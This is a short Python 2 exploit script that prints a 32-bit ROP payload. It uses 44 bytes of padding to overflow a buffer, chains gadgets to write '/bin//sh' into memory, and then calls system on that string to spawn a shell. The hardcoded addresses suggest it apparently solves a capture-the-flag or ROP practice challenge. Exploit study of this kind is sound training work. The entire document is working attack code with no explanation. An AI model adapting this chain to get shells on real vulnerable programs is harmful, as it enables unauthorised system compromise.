#!/usr/bin/python

import struct

chain = "A"*44
chain += struct.pack('<I', 0x080486da)	# pop edi ; pop ebp ; ret
chain += struct.pack('<I', 0x0804a028) 	# address to write to
chain += "/bin"				# /bin
chain += struct.pack('<I', 0x08048670)	# mov dword ptr [edi], ebp
chain += struct.pack('<I', 0x080486da)	# pop edi ; pop ebp ; ret
chain += struct.pack('<I', 0x0804a02c) 	# address to write to
chain += "//sh"
chain += struct.pack('<I', 0x08048670)	# mov dword ptr [edi], ebp
chain += struct.pack('<I', 0x0804865a)	# system
chain += struct.pack('<I', 0x0804a028)  # address of /bin//sh
print chain
